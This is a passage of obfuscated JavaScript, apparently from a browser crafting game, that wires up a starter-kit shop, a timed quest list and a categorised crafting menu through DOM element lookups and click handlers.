			document[ΔᐃⲆⵠⲆⵠΔ[68]]("case_agree")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ⵠⵠᐃᐃ.ΔᐃΔⵠⲆ, ⲆⲆᐃⵠᐃ);
			this.ΔᐃᐃⲆΔ = {
				open: false,
				"ᐃⵠΔΔᐃ": -Ⲇᐃⵠ,
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠⲆ]),
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[412]),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[412]).style,
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(Δᐃⵠᐃ - 300) + ⵠ[39];
					this.style.top = Math.floor(ᐃΔⵠᐃ - 215) + ⵠ[39]
				},
				"ⵠΔΔΔᐃ": function() {
					ΔⵠⵠⲆ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
					ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.style.display = ⵠ[465]
				},
				select: function() {
					ΔⵠⵠⲆ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = !ΔⵠⵠⲆ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]];
					if (!ΔⵠⵠⲆ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]]) ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.style.display = ⵠ[465];
					else ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.style.display = ⵠ[35]
				},
				"ᐃⵠⲆΔᐃⲆᐃ": function() {
					if (ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.ᐃⵠΔΔᐃ >= 0) {
						ΔⵠⲆᐃ.ⵠⵠᐃᐃΔⵠΔⵠΔ(ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.ᐃⵠΔΔᐃ);
						ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.ⵠΔΔΔᐃ();
						if (ga) ga(ⵠ[499], ⵠ[37], ⵠ[383], ⵠ[198], "" + ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.ᐃⵠΔΔᐃ)
					}
				},
				"ⲆⲆⲆΔⵠ": function() {
					var Δᐃᐃⵠⵠ = ᐃᐃΔ.ΔᐃᐃⲆΔ.value;
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("points_bank")[ΔᐃⲆⵠⲆⵠΔ[290]] = ΔΔⲆᐃ.ⵠΔΔⲆⵠΔΔ(Δᐃᐃⵠⵠ) + " points";
					for (var ⵠᐃ = ⵠΔⲆⵠ; ⵠᐃ < ⲆᐃⵠⲆⵠᐃⲆ.length; ⵠᐃ++) {
						if (ⲆᐃⵠⲆⵠᐃⲆ[ⵠᐃ].Δᐃᐃⵠⵠ > Δᐃᐃⵠⵠ) document[ΔᐃⲆⵠⲆⵠΔ[68]]("starter" + (ⵠᐃ + ΔΔΔ)).style[ⵠ[259]] = "0.4";
						else document[ΔᐃⲆⵠⲆⵠΔ[68]]("starter" + (ⵠᐃ + 1)).style[ⵠ[259]] = "1"
					}
					for (ⵠᐃ = 1; ⵠᐃ < ΔⲆⵠΔⵠ; ⵠᐃ++) {
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[176] + ⵠᐃ).src = "./img/empty-shop.png";
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("amount_shop" + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = ""
					}
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[486]).style[ⵠ[259]] = "0.2"
				},
				"ᐃⵠⲆⲆⲆⲆᐃΔᐃ": function() {
					if (this.id.length > 8) var ᐃΔ = Number(this.id.charAt(ᐃᐃᐃⵠᐃ) + this.id.charAt(8));
					else var ᐃΔ = Number(this.id.charAt(ᐃᐃᐃⵠᐃ));
					var ᐃⵠⲆΔ = ⲆᐃⵠⲆⵠᐃⲆ[ᐃΔ - ᐃΔᐃⲆ];
					if (ᐃᐃΔ.ΔᐃᐃⲆΔ.value >= ᐃⵠⲆΔ.Δᐃᐃⵠⵠ) {
						ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.ᐃⵠΔΔᐃ = ᐃΔ;
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[486]).style[ⵠ[259]] = "1"
					} else {
						ΔⵠⵠⲆ.ΔᐃᐃⲆΔ.ᐃⵠΔΔᐃ = -ⵠΔᐃ;
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[486]).style[ⵠ[259]] = "0.2"
					}
					ᐃⵠⲆΔ = ᐃⵠⲆΔ.items;
					for (var ⵠᐃ = 1, ᐃⵠᐃⵠ = ᐃⲆᐃ; ⵠᐃ < ᐃⵠⲆΔ.length + ⵠΔΔ; ⵠᐃ++) {
						if (ᐃⵠⲆΔ[ⵠᐃ - ⲆⵠⲆⲆ][ⵠΔᐃ] === ᐃᐃ.ⵠᐃᐃⵠ) continue;
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[176] + ᐃⵠᐃⵠ).style.display = ⵠ[35];
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[176] + ᐃⵠᐃⵠ).src = ⵠⲆ[ⲆⲆⵠᐃ[ᐃⵠⲆΔ[ⵠᐃ - ⵠΔⲆ][1]].ᐃⵠ][ⲆΔⵠ].ⲆⲆᐃⲆⲆ === undefined ? ⵠⲆ[ⲆⲆⵠᐃ[ᐃⵠⲆΔ[ⵠᐃ - 1][1]].ᐃⵠ][0].src : ⵠⲆ[ⲆⲆⵠᐃ[ᐃⵠⲆΔ[ⵠᐃ - ᐃᐃⵠ][1]].ᐃⵠ][0].ⲆⲆᐃⲆⲆ;
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("amount_shop" + ᐃⵠᐃⵠ)[ΔᐃⲆⵠⲆⵠΔ[290]] = "" + ᐃⵠⲆΔ[ⵠᐃ - ΔᐃⲆⵠ][ᐃⵠΔ];
						ᐃⵠᐃⵠ++
					}
					for (; ᐃⵠᐃⵠ < ⲆⵠΔᐃⵠ; ᐃⵠᐃⵠ++) {
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[176] + ᐃⵠᐃⵠ).src = "./img/empty-shop.png";
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("amount_shop" + ᐃⵠᐃⵠ)[ΔᐃⲆⵠⲆⵠΔ[290]] = ""
					}
				}
			};
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("quit3")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ΔᐃᐃⲆΔ.ⵠΔΔΔᐃ, false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[486])[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ΔᐃᐃⲆΔ.ᐃⵠⲆΔᐃⲆᐃ, false);
			for (var ⵠᐃ = 1; ⵠᐃ < ⵠⲆⲆᐃⲆⵠⵠ; ⵠᐃ++) document[ΔᐃⲆⵠⲆⵠΔ[68]]("starter" + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ΔᐃᐃⲆΔ.ᐃⵠⲆⲆⲆⲆᐃΔᐃ, false);
			this.ᐃⲆᐃⲆ = {
				open: false,
				"ⵠᐃΔΔΔ": ΔΔᐃᐃ.get(ⵠ[107]) ? ΔΔᐃᐃ.get(ⵠ[107]) === "1" ? ΔᐃᐃⲆ : ΔΔⵠ : ΔΔⵠ,
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠΔΔ]),
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("chronoquest"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("chronoquest").style,
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(Δᐃⵠᐃ - 420) + ⵠ[39];
					this.style.top = Math.floor(ᐃΔⵠᐃ - 270) + ⵠ[39]
				},
				"ⵠΔΔΔᐃ": function() {
					ΔⵠⵠⲆ.ᐃⲆᐃⲆ.style.display = ⵠ[465];
					ΔⵠⵠⲆ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] = false
				},
				select: function() {
					ΔⵠⵠⲆ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] = !ΔⵠⵠⲆ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]];
					if (!ΔⵠⵠⲆ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]]) ΔⵠⵠⲆ.ᐃⲆᐃⲆ.style.display = ⵠ[465];
					else ΔⵠⵠⲆ.ᐃⲆᐃⲆ.style.display = ⵠ[35]
				},
				list: [],
				reset: function() {
					for (var ⵠᐃ = ⲆΔⵠ; ⵠᐃ < ⵠΔⲆᐃᐃⵠⲆ.length; ⵠᐃ++) {
						this.list[ⵠᐃ] = ⵠΔᐃ;
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[182] + ⵠᐃ).style.display = ⵠ[35];
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[81] + ⵠᐃ).style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[ᐃⵠΔⵠΔΔᐃ] + ⵠᐃ).style.display = ⵠ[465]
					}
				},
				"ᐃΔΔΔⵠΔⵠ": 0,
				"ΔΔⲆⲆⲆΔᐃ": 0,
				"ⲆΔΔⲆΔΔⵠΔⵠ": function() {
					if (!ΔⵠⵠⲆ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]]) return;
					var ᐃᐃΔⲆⵠ = (new Date).getTime();
					if (ᐃᐃΔⲆⵠ - this.ᐃΔΔΔⵠΔⵠ < 1e3) return;
					this.ᐃΔΔΔⵠΔⵠ = ᐃᐃΔⲆⵠ;
					for (var ⵠᐃ = 0; ⵠᐃ < ⵠΔⲆᐃᐃⵠⲆ.length; ⵠᐃ++) {
						if (!ΔⵠⵠⲆ.ᐃⲆᐃⲆ.list[ⵠᐃ]) continue;
						var ΔᐃⲆ = ⵠΔⲆᐃᐃⵠⲆ[ⵠᐃ].time - (ᐃᐃΔⲆⵠ - ⲆⲆⲆ.ⲆΔΔΔⵠ.ⲆⲆⲆΔⵠ + ΔⵠⵠⲆ.ᐃⲆᐃⲆ.ΔΔⲆⲆⲆΔᐃ);
						if (ΔᐃⲆ > 96e4) {
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[182] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = Math.floor(ΔᐃⲆ / 48e4) + " days"
						} else if (ΔᐃⲆ > 48e4) {
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[182] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = Math.floor(ΔᐃⲆ / 48e4) + " day"
						} else if (ΔᐃⲆ > 6e4) {
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[182] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = Math.floor(ΔᐃⲆ / 6e4) + " min"
						} else document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[182] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = Math.floor(ΔᐃⲆ / 1e3) + " sec"
					}
				},
				restore: function(ⲆⲆⵠΔ) {
					for (var ⵠᐃ = ΔᐃΔΔ; ⵠᐃ < ⲆⲆⵠΔ.length; ⵠᐃ++) {
						if (ⲆⲆⵠΔ[ⵠᐃ] != 1) ΔⵠⵠⲆ.ᐃⲆᐃⲆ.ⲆΔⲆᐃΔΔᐃ(ⵠᐃ, ⲆⲆⵠΔ[ⵠᐃ])
					}
				},
				"ⲆΔⲆᐃΔΔᐃ": function(ᐃΔ, ᐃᐃⵠⵠ) {
					if (ᐃᐃⵠⵠ === 3 && (ᐃΔ === ΔⵠᐃΔⵠ || ᐃΔ === ΔᐃΔΔΔΔⵠ)) {
						ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠⵠⵠⵠⵠΔⲆ(ᐃⵠⲆⵠ, ⵠΔΔ);
						ΔⵠⵠⲆ.ᐃⵠᐃⲆᐃⲆΔ()
					}
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[182] + ᐃΔ)[ΔᐃⲆⵠⲆⵠΔ[290]] = "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
					if (ᐃᐃⵠⵠ > ⲆⵠⲆⲆ) {
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[81] + ᐃΔ)[ΔᐃⲆⵠⲆⵠΔ[290]] = "SUCCEED";
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[182] + ᐃΔ).style.display = ⵠ[465]
					} else if (ᐃᐃⵠⵠ === ᐃΔΔ) {
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[81] + ᐃΔ)[ΔᐃⲆⵠⲆⵠΔ[290]] = "FAILED";
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[182] + ᐃΔ).style.display = ⵠ[465]
					}
					if (ᐃᐃⵠⵠ === 2) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[11] + ᐃΔ).style.display = ⵠ[35];
					else document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[ΔΔΔΔⲆⵠⲆ] + ᐃΔ).style.display = ⵠ[465];
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[81] + ᐃΔ).style.display = "inline";
					ΔⵠⵠⲆ.ᐃⲆᐃⲆ.list[ᐃΔ] = 0
				},
				modify: function(ᐃΔ, ᐃᐃⵠⵠ) {
					ΔⵠⵠⲆ.ᐃⲆᐃⲆ.ⲆΔⲆᐃΔΔᐃ(ᐃΔ, ᐃᐃⵠⵠ);
					if (ΔⵠⵠⲆ.ᐃⲆᐃⲆ.ⵠᐃΔΔΔ) {
						ΔⵠⵠⲆ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] = true;
						ΔⵠⵠⲆ.ᐃⲆᐃⲆ.style.display = ⵠ[35]
					}
				},
				"ΔᐃΔⵠⲆ": function() {
					if (!ΔⵠⵠⲆ.ᐃⲆᐃⲆ.ⵠᐃΔΔΔ) {
						ΔΔᐃᐃ.set(ⵠ[107], "1");
						ΔⵠⵠⲆ.options.ⵠⲆᐃⲆⲆⲆⲆ.display = ⵠ[35]
					} else {
						ΔΔᐃᐃ.set(ⵠ[107], "0");
						ΔⵠⵠⲆ.options.ⵠⲆᐃⲆⲆⲆⲆ.display = ⵠ[465]
					}
					ΔⵠⵠⲆ.ᐃⲆᐃⲆ.ⵠᐃΔΔΔ = !ΔⵠⵠⲆ.ᐃⲆᐃⲆ.ⵠᐃΔΔΔ
				},
				"ⵠΔⲆⵠⵠΔΔⲆⵠ": function() {
					var ᐃⵠⵠⵠ = Number(this.id.charAt(ⵠΔΔⵠⲆ));
					var ⵠΔᐃΔⵠ = Number(this.id.charAt(ΔⵠⵠΔⵠᐃⲆ));
					if (this.id.charAt(14) !== "" && ⵠΔᐃΔⵠ >= ΔᐃΔΔ && ⵠΔᐃΔⵠ <= 9) ᐃⵠⵠⵠ = ᐃⵠⵠⵠ * ⵠⵠⲆΔΔ + ⵠΔᐃΔⵠ;
					ΔⵠⲆᐃ.ⲆᐃⲆΔᐃΔⲆΔᐃ(ᐃⵠⵠⵠ)
				}
			};
			this.ᐃⲆᐃⲆ.ⵠᐃΔΔΔ ? this.options.ⵠⲆᐃⲆⲆⲆⲆ.display = ⵠ[35] : this.options.ⵠⲆᐃⲆⲆⲆⲆ.display = ⵠ[465];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[487])[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ᐃⲆᐃⲆ.ⵠΔΔΔᐃ, ⵠΔⲆⲆⲆ);
			for (var ⵠᐃ = ΔΔⵠⵠ; ⵠᐃ < ⵠΔⲆᐃᐃⵠⲆ.length; ⵠᐃ++) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[11] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ᐃⲆᐃⲆ.ⵠΔⲆⵠⵠΔΔⲆⵠ, false);
			this.ΔΔΔΔ = {
				open: ⲆΔᐃⲆΔ,
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃᐃⲆΔᐃⵠ]),
				list: {
					id: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[438]),
					style: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[438]).style,
					"ⲆᐃⲆΔⲆⵠᐃ": [],
					"ΔᐃΔΔⵠⵠΔ": 0,
					"ⵠⲆᐃ": function() {
						this.style.left = Math.floor(Δᐃⵠᐃ - 335) + ⵠ[39];
						this.style.top = Math.floor(ᐃΔⵠᐃ - 215) + ⵠ[39]
					},
					"ⵠΔΔΔᐃ": function() {
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[438]).style.display = ⵠ[465];
						ΔⵠⵠⲆ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = false
					},
					"ⵠⲆⵠⲆᐃᐃᐃ": function() {
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[438]).style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[300]).style.display = ⵠ[35]
					},
					"ⵠⲆΔⵠ": function(ⵠᐃ) {
						var ⲆⲆⵠ = this.ⲆᐃⲆΔⲆⵠᐃ[ⵠᐃ];
						if (ⲆⲆⵠ.ᐃⲆΔ) document[ΔᐃⲆⵠⲆⵠΔ[68]]("watercraft").style.display = ⵠ[35];
						else document[ΔᐃⲆⵠⲆⵠΔ[68]]("watercraft").style.display = ⵠ[465];
						if (ⲆⲆⵠ.f) document[ΔᐃⲆⵠⲆⵠΔ[68]]("firecraft").style.display = ⵠ[35];
						else document[ΔᐃⲆⵠⲆⵠΔ[68]]("firecraft").style.display = ⵠ[465];
						if (ⲆⲆⵠ.w) document[ΔᐃⲆⵠⲆⵠΔ[68]]("workcraft").style.display = ⵠ[35];
						else document[ΔᐃⲆⵠⲆⵠΔ[68]]("workcraft").style.display = ⵠ[465];
						if (ⲆⲆⵠ.e) document[ΔᐃⲆⵠⲆⵠΔ[68]]("wellcraft").style.display = ⵠ[35];
						else document[ΔᐃⲆⵠⲆⵠΔ[68]]("wellcraft").style.display = ⵠ[465];
						var ⲆⲆⵠ = ⲆⲆⵠ.r;
						for (var ⵠᐃ = 0, ᐃⵠᐃⵠ = 1; ⵠᐃ < ⲆⲆⵠ.length; ⵠᐃ++) {
							document[ΔᐃⲆⵠⲆⵠΔ[68]]("inv" + ᐃⵠᐃⵠ).style.display = ⵠ[35];
							document[ΔᐃⲆⵠⲆⵠΔ[68]]("inv" + ᐃⵠᐃⵠ).src = ⵠⲆ[ⲆⲆⵠᐃ[ⲆⲆⵠ[ⵠᐃ][ⵠᐃⲆᐃ]].ᐃⵠ][ⵠΔⲆⵠ].ⲆⲆᐃⲆⲆ === ᐃᐃⵠⵠΔ ? ⵠⲆ[ⲆⲆⵠᐃ[ⲆⲆⵠ[ⵠᐃ][0]].ᐃⵠ][0].src : ⵠⲆ[ⲆⲆⵠᐃ[ⲆⲆⵠ[ⵠᐃ][ΔΔⵠ]].ᐃⵠ][0].ⲆⲆᐃⲆⲆ;
							document[ΔᐃⲆⵠⲆⵠΔ[68]]("numb" + ᐃⵠᐃⵠ)[ΔᐃⲆⵠⲆⵠΔ[290]] = "" + ⲆⲆⵠ[ⵠᐃ][ᐃⲆᐃ];
							ᐃⵠᐃⵠ++
						}
						for (; ᐃⵠᐃⵠ < 6; ᐃⵠᐃⵠ++) {
							document[ΔᐃⲆⵠⲆⵠΔ[68]]("inv" + ᐃⵠᐃⵠ).style.display = ⵠ[465];
							document[ΔᐃⲆⵠⲆⵠΔ[68]]("numb" + ᐃⵠᐃⵠ)[ΔᐃⲆⵠⲆⵠΔ[290]] = ""
						}
					},
					select: function(ΔᐃΔΔⵠⵠΔ) {
						this.ΔᐃΔΔⵠⵠΔ = ΔᐃΔΔⵠⵠΔ;
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[300]).style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("workcraft").style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("firecraft").style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("watercraft").style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("wellcraft").style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[438]).style.display = ⵠ[35];
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("inv1").style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("inv2").style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("inv3").style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("inv4").style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("inv5").style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("numb1")[ΔᐃⲆⵠⲆⵠΔ[290]] = "";
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("numb2")[ΔᐃⲆⵠⲆⵠΔ[290]] = "";
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("numb3")[ΔᐃⲆⵠⲆⵠΔ[290]] = "";
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("numb4")[ΔᐃⲆⵠⲆⵠΔ[290]] = "";
						document[ΔᐃⲆⵠⲆⵠΔ[68]]("numb5")[ΔᐃⲆⵠⲆⵠΔ[290]] = "";
						for (var ⵠᐃ = ᐃⵠⲆ, ᐃⵠᐃⵠ = 0; ⵠᐃ < ⵠⲆⵠᐃΔ.length; ⵠᐃ++) {
							var ⲆⲆⵠ = ⵠⲆⵠᐃΔ[ⵠᐃ];
							if (ΔᐃΔΔⵠⵠΔ === ⲆⲆⵠ.ΔᐃⲆ) {
								this.ⲆᐃⲆΔⲆⵠᐃ[ᐃⵠᐃⵠ] = ⲆⲆⵠ;
								ᐃⵠᐃⵠ++;
								document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_" + ᐃⵠᐃⵠ).style.display = ⵠ[35];
								document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_" + ᐃⵠᐃⵠ).src = ⵠⲆ[ⲆⲆⵠᐃ[ⲆⲆⵠ.ⵠΔᐃⲆ].ᐃⵠ][0].ⲆⲆᐃⲆⲆ === undefined ? ⵠⲆ[ⲆⲆⵠᐃ[ⲆⲆⵠ.ⵠΔᐃⲆ].ᐃⵠ][0].src : ⵠⲆ[ⲆⲆⵠᐃ[ⲆⲆⵠ.ⵠΔᐃⲆ].ᐃⵠ][0].ⲆⲆᐃⲆⲆ
							}
						}
						for (ᐃⵠᐃⵠ++; ᐃⵠᐃⵠ < 49; ᐃⵠᐃⵠ++) document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_" + ᐃⵠᐃⵠ).style.display = ⵠ[465]
					}
				},
				"ⲆⵠᐃⲆⵠⵠᐃ": {
					id: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[300]),
					style: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[300]).style,
					"ⵠⲆᐃ": function() {
						this.style.left = Math.floor(Δᐃⵠᐃ - 285) + ⵠ[39];
						this.style.top = Math.floor(ᐃΔⵠᐃ - 170) + ⵠ[39]
					},
					"ⵠΔΔΔᐃ": function() {
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[300]).style.display = ⵠ[465];
						ΔⵠⵠⲆ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] = false
					}
				},
				"ΔⵠⲆⲆᐃᐃⲆⵠⵠ": function() {
					this[ΔᐃⲆⵠⲆⵠΔ[72]] = !this[ΔᐃⲆⵠⲆⵠΔ[72]];
					if (!this[ΔᐃⲆⵠⲆⵠΔ[72]]) {
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[300]).style.display = ⵠ[465];
						document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[438]).style.display = ⵠ[465]
					} else document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[300]).style.display = ⵠ[35]
				}
			};
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("quit")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ΔΔΔΔ.ⲆⵠᐃⲆⵠⵠᐃ.ⵠΔΔΔᐃ, ⲆᐃⵠⲆⵠ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("quitmenu")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ΔΔΔΔ.list.ⵠΔΔΔᐃ, false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("backhome")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.ΔΔΔΔ.list.ⵠⲆⵠⲆᐃᐃᐃ, false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("hatcategory")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.select(ⵠⲆΔᐃ.ΔⲆΔⵠᐃ)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("weaponcategory")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.select(ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ)
			}), ⲆᐃⵠⲆⵠ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("toolcategory")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.select(ⵠⲆΔᐃ.Δⵠⵠⵠᐃ)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("foodcategory")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.select(ⵠⲆΔᐃ.ΔᐃΔⵠΔ)
			}), ⲆⲆᐃⵠᐃ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("placeablecategory")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.select(ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("constructioncategory")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.select(ⵠⲆΔᐃ.ⲆⲆΔᐃⲆ)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_1")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(0)
			}), ΔᐃᐃⲆⲆ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_2")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(ⵠΔⵠΔ)
			}), ⵠΔⲆⲆⲆ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_3")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(2)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_4")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(3)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_5")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(4)
			}), ⲆᐃⵠⲆⵠ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_6")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(ⵠᐃΔⵠ)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_7")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(ᐃⵠΔⵠⲆⲆⲆ)
			}), ⲆⲆᐃⵠᐃ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_8")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(7)
			}), ⲆΔᐃⲆΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_9")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(8)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_10")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
